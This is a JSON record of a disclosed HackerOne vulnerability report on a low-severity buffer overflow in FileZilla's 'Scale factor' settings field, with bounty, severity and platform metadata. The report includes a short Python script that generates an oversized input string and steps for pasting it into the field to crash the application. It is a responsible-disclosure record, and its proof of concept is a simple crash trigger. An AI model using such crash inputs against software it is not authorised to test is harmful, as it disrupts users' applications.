@@ -1,0 +1,141 @@
+{
+  "id": 798301,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83OTgzMDE=",
+  "url": "https://hackerone.com/reports/798301",
+  "title": "FileZilla 3.46.3 - 'Scale factor' Buffer Overflow",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2020-02-17T21:45:57.727Z",
+  "submitted_at": "2020-02-17T21:45:57.727Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ayson88",
+    "url": "/ayson88",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/SdwRymAkQVxHMwfLz1axfoqQ/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 36713,
+    "url": "https://hackerone.com/filezilla",
+    "handle": "filezilla",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/bzHM1r1anRyW7dJ7i7UsuQut/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/bzHM1r1anRyW7dJ7i7UsuQut/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "FileZilla",
+      "twitter_handle": "",
+      "website": "https://filezilla-project.org/",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-11-21T18:19:42.483Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-10-22T18:19:42.171Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nFileZilla in has a problem in the \"Scale Factor\" field is vulnerable to a Buffer Over Flow attack or a denial attack. Adding random characters in an entry that must accept only Float input type values.\n\n## Steps To Reproduce:\nA python file of name generatepaste.py was generated for the generation of the chain that allows the overflow, which is the following:\n\nbuffer = \"\\x41\" * 5000000\neip= \"\\x42\" * 4\nf = open (\"generate.txt\", \"w\")\nf.write(buffer+eip)\nf.close()\n\n  1.- Run python code : python generatepaste.py\n  2.- Open generate.txt and copy content to clipboard.\n  3.- Open FileZilla.\n  4.- Select the Edit menu and then Settings.\n  5.- Find the Interface section and select Themes.\n  6.- Paste Clipboard on \"Scale Factor\" three times.\n  7.- Click in the icons.\n  8.- BoF\n\n\n## Supporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n  * [attachment / reference]\nF719632\n\n## Impact\n\nAn attacker can corrupt FileZilla applications and be a preamble to a much more severe attack.",
+  "bounty_amount": "250.0",
+  "formatted_bounty": "$250",
+  "weakness": {
+    "id": 3,
+    "name": "Classic Buffer Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 719632,
+      "file_name": "Captura.JPG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9P38hcCguipubRoYgTe4xy9r?response-content-disposition=attachment%3B%20filename%3D%22Captura.JPG%22%3B%20filename%2A%3DUTF-8%27%27Captura.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQV2I7C47M%2F20260220%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260220T234909Z&X-Amz-Expires=673&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCIj68hpPtc9OPN4eK08isaT2yhnAE9j4g7%2BlrVKCPwmwIgbory0DHEjZrfboZ2OJYgRJUGYTRSyAdf8foMDhrdrCMquwUIm%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDNa%2BUUVfVHa4J7owXSqPBctWuIOVhHbhWJLcWVBlZbPs3Q%2FZXOzyJ91N6nAxnyT%2BMcvKHDFvaulWp3dSVsvuXIZY6R61cKHjRRjC1qrpLP4F3T4gadqocP%2FNDARZEkVoYNpMEY4RpxqPfgyt5YhecQL6QjgDdp4dH18Vhyyf2pdvo6bB4aJwpbJ0U4j4uVxclZRBKj4W8ks1YnXj4obXcVMpl2zKJXHB1dcgHYissoSyYyXwiU4GrKu5TTK0Kd6CJzPsR6%2Bov0XpbAWUZSxYgeskbPsenxI4nWLWR9xTbzc%2Fiu212tftg9n2yp8pAqLyaM2sObCw0LWeJLKnqh4KbIawHcI6TZgqSDZzIRpNI%2BPUUeHGQbYKA6XZ2MdT3NZEljHl%2BB0%2Fqq%2B7VpVniIyKKnqosOQul3iNcXnSD9y1zfbEDueZUBv2wUIKr%2F9BV%2B1dYRtD9%2B5d4gk2rc5pgOhT3K59VqIzzw1bA%2BwF%2FigTM8DpbwH8njuwrlzurf9UIeRws9n%2BEzL2mxn%2FwC73nxuPFFUXEfz2DT5DC3R%2FU7E%2BROGdaM%2FX6hB7rTNG35Dk%2Blm6pIRYMq3bhK%2F55kbPRv9QeNw3hPklVng4ys5upjm6ADAlZ82lBE9GwbgxDhlDw9gQhdMBKMtnncp3wmX9g79Kzj6dBoijESxtkKeDIX8De7XZmuaTnbWss6x%2BXOP1hUQT%2BYbDhg9YAcaYLGoSTosaetkxb0K7Q%2FVyqSmDriKgql%2Be9XOR2RCp1Z0RP6LbvAdTPIwly72RMtNUZxSOV0sbnLWqT9AAyFvDI8BdCBo34CVWkZfhg5e4C5m7lZSXToiA5LHIN66tsL9ZOb%2Fy%2BJmrv%2FD%2FrDRSscdFztYbxPez2sQUXFGVZs9yXLy%2Fev1cmB4w5bjizAY6sQErIM2jbwhyfAK6rrrYH%2BedgwDQqaFLCA2ZOWiYrntThLkOJ85Cxj4%2FfQBuM96AZ4RIMOwCfVrNyXqGNJ8Q85aMWD1Zb%2Bult28xjXP2kJ%2B7ktDSzHsVT71wV39ZD%2FlGH8%2FWe3NXekHrxP2nVkRebMRt0zmviELNQ7tJLUFFCAgycfUbSAeu8nYZ047y2OXCMws6LKiFYnYrNMkJJcf1t1%2FY4zuS9wgcPAf9oEtuQC%2B2opk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ae258f172a424120b1c8d27a1a6679abe09758492373dcb00940d28a694ab049",
+      "file_size": 158524,
+      "type": "image/jpeg",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-11-21T18:19:42.240Z",
+  "allow_singular_disclosure_after": -165648567.4034021,
+  "singular_disclosure_allowed": true,
+  "vote_count": 16,
+  "voters": [
+    "sameerphad72",
+    "h4x0r_dz",
+    "2026",
+    "fuomag9",
+    "cryptographer",
+    "t3chn0phil3",
+    "mexaw7413",
+    "mwcysec",
+    "3lp3rr0",
+    "leo_shun",
+    "and 6 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "low"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
